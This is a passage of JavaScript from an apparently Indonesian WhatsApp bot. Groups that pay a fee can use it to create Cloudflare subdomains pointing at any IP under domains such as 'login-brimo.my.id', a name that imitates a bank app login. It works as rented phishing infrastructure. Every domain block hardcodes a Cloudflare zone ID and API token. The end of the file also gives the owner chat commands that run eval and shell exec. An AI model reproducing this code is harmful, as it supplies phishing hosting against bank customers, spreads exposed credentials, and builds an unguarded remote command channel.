if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break 
//=================================================//                          
case 'domain13':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain13(host, ip) {
return new Promise((resolve13) => {
let zone13 = "22e15ac64a9dce7889fb0ddf5e9fe407";
let apiToken13 = "B9G2OG5WLjFWaHm8d3X_0ju2229JxPu9yzMAn1Lj";
let tld13 = "aplikasiiku.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone13}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld13, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 13, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken13,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve13({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err13 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err13Str = String(err13);
resolve13({ success: false, error: err13Str });
});
});
}

let raw13 = args?.join(" ")?.trim();
if (!raw13) return m.reply("Enter Name & IP");
let host13 = raw13
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host13) return m.reply("Name Fail");
let ip13 = raw13.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip13 || ip13.split(".").length < 4) return m.reply(ip13 ? "IP Fail" : "Enter IP");

subDomain13(host13, ip13).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
//=================================================//
case 'domain17':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain17(host, ip) {
return new Promise((resolve17) => {
let zone17 = "33c79c9d02e6124646aac8ff8d544d8e";
let apiToken17 = "Y1KndpliNn9GgqxIV6EWOYT7RpmxrCYeJI6NpeU1";
let tld17 = "sitesss.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone17}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld17, content: ip.replace(/[^0-9.]/gi, ""), ttl: 4600, priority: 17, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken17,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve17({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err17 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err17Str = String(err17);
resolve17({ success: false, error: err17Str });
});
});
}

let raw17 = args?.join(" ")?.trim();
if (!raw17) return m.reply("Enter Name & IP");
let host17 = raw17
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host17) return m.reply("Name Fail");
let ip17 = raw17.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip17 || ip17.split(".").length < 4) return m.reply(ip17 ? "IP Fail" : "Enter IP");

subDomain17(host17, ip17).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
case 'domain15':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain15(host, ip) {
return new Promise((resolve15) => {
let zone15 = "7d04df3cc788fc8d0fca0ab67f4105f2";
let apiToken15 = "cd2rrMaF-356FwZbnITLdSG1-EkZtoAQvNI3pBmB";
let tld15 = "video-baru2022.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone15}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld15, content: ip.replace(/[^0-9.]/gi, ""), ttl: 15600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken15,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve15({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err15 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err15Str = String(err15);
resolve15({ success: false, error: err15Str });
});
});
}

let raw15 = args?.join(" ")?.trim();
if (!raw15) return m.reply("Enter Name & IP");
let host15 = raw15
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host15) return m.reply("Name Fail");
let ip15 = raw15.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip15 || ip15.split(".").length < 4) return m.reply(ip15 ? "IP Fail" : "Enter IP");

subDomain15(host15, ip15).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
case 'domain16':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain16(host, ip) {
return new Promise((resolve16) => {
let zone16 = "c17210fdd3cc50d85edf28352ec3a862";
let apiToken16 = "JPwfqEKPT-b9hd2DDd3Yl0NBZ6d7wddmESAqBRZ3";
let tld16 = "linkkuu.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone16}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld16, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken16,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve16({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err16 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err16Str = String(err16);
resolve16({ success: false, error: err16Str });
});
});
}

let raw16 = args?.join(" ")?.trim();
if (!raw16) return m.reply("Enter Name & IP");
let host16 = raw16
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host16) return m.reply("Name Fail");
let ip16 = raw16.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip16 || ip16.split(".").length < 4) return m.reply(ip16 ? "IP Fail" : "Enter IP");

subDomain16(host16, ip16).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break 
//=================================================//                          
case 'domain18':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain18(host, ip) {
return new Promise((resolve18) => {
let zone18 = "21e58e98665a970417b24d37d22eee44";
let apiToken18 = "NCCnigFX5Txx-31LcJWMAkIup-bzA3-APT3-AKbZ";
let tld18 = "login-brimo.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone18}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld18, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 18, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken18,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve18({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err18 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err18Str = String(err18);
resolve18({ success: false, error: err18Str });
});
});
}

let raw18 = args?.join(" ")?.trim();
if (!raw18) return m.reply("Enter Name & IP");
let host18 = raw18
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host18) return m.reply("Name Fail");
let ip18 = raw18.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip18 || ip18.split(".").length < 4) return m.reply(ip18 ? "IP Fail" : "Enter IP");

subDomain18(host18, ip18).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
//=================================================//
case 'domain14':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain14(host, ip) {
return new Promise((resolve14) => {
let zone14 = "778d36c10c522f72ed2e46fb508bf439";
let apiToken14 = "EDK0rSIqZXBOXTi3I9dbfIX94MBbDZmsCYhaDhFK";
let tld14 = "linkkuu.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone14}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld14, content: ip.replace(/[^0-9.]/gi, ""), ttl: 4600, priority: 14, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken14,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve14({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err14 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err14Str = String(err14);
resolve14({ success: false, error: err14Str });
});
});
}

let raw14 = args?.join(" ")?.trim();
if (!raw14) return m.reply("Enter Name & IP");
let host14 = raw14
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host14) return m.reply("Name Fail");
let ip14 = raw14.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip14 || ip14.split(".").length < 4) return m.reply(ip14 ? "IP Fail" : "Enter IP");

subDomain14(host14, ip14).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    MEYBotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
